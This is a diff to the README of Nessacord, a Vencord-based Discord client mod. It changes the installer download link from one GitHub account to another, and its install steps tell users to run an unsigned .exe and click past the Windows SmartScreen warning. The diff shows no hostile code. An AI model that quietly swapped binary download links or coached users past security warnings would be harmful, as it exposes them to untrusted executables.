@@ -6,7 +6,7 @@
 
 A Discord client mod in black and lace. Built on [Vencord](https://github.com/Vendicated/Vencord).
 
-**[Download NessacordInstaller.exe](https://github.com/SerenityDiscko/nessacord/releases/latest/download/NessacordInstaller.exe)**
+**[Download NessacordInstaller.exe](https://github.com/deargodx/nessacord/releases/latest/download/NessacordInstaller.exe)**
 
 </div>
 
@@ -19,7 +19,7 @@ A Discord client mod in black and lace. Built on [Vencord](https://github.com/Ve
 
 ## Install
 
-1. Download **[NessacordInstaller.exe](https://github.com/SerenityDiscko/nessacord/releases/latest/download/NessacordInstaller.exe)** and run it. It isn't code-signed, so Windows may say it "protected your PC". Choose **More info**, then **Run anyway**.
+1. Download **[NessacordInstaller.exe](https://github.com/deargodx/nessacord/releases/latest/download/NessacordInstaller.exe)** and run it. It isn't code-signed, so Windows may say it "protected your PC". Choose **More info**, then **Run anyway**.
 2. Tick the Discord versions you want Nessacord in (Stable, PTB or Canary), then choose **Install**.
 3. Discord restarts with Nessacord.
 
